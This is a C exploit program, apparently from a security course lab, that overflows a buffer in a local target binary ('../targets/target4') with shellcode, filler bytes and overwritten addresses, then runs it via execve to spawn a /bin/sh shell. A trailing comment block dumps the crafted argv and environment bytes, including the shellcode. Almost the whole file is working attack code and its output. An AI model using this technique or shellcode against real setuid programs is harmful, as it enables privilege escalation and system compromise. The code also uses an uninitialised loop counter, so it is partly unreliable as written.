#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define LENGTH 169
#define ADDR_LEN 4

int main(void)
{
  char *args[3];
  char *env[7];

  char exploit[LENGTH] = "";

  int i;
  while(i < LENGTH / ADDR_LEN){
	  strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
	  i++;
  }

  strcat(exploit, "\x94\x00\x00\x00"); // i = 148 

  for(i = 0; i < strlen(shellcode); i++){
    exploit[i] = shellcode[i];
  }

  args[0] = TARGET; 
  args[1] = exploit; 
  args[2] = NULL;
  
  env[0] = "\x00";
  env[1] = "\x00";

  env[2] = "\xa8\x00\x00\x00"; // len = 168
  env[3] = "\x00";
  env[4] = "\x00";
  
  env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30";
  env[6] = NULL;

  print_argv(args, env);

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

// Printing char *argv[]:
// argv[0] Printing Hex Code:
// \x2e\x2e\x2f\x74
// \x61\x72\x67\x65
// \x74\x73\x2f\x74
// \x61\x72\x67\x65
// \x74\x34\x00\x00
// 
// argv[1] Printing Hex Code:
// \xeb\x1f\x5e\x89
// \x76\x08\x31\xc0
// \x88\x46\x07\x89
// \x46\x0c\xb0\x0b
// \x89\xf3\x8d\x4e
// \x08\x8d\x56\x0c
// \xcd\x80\x31\xdb
// \x89\xd8\x40\xcd
// \x80\xe8\xdc\xff
// \xff\xff\x2f\x62
// \x69\x6e\x2f\x73
// \x68\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x98\x00\x00\x00
// 
// Printing char *env[]:
// env[0] Printing Hex Code:
// 
// env[1] Printing Hex Code:
// 
// env[2] Printing Hex Code:
// \xa8\x00\x00\x00
// 
// env[3] Printing Hex Code:
// 
// env[4] Printing Hex Code:
// 
// env[5] Printing Hex Code:
// \xf0\xfd\x21\x30
// \xf0\xfd\x21\x30
// \xf0\xfd\x21\x30

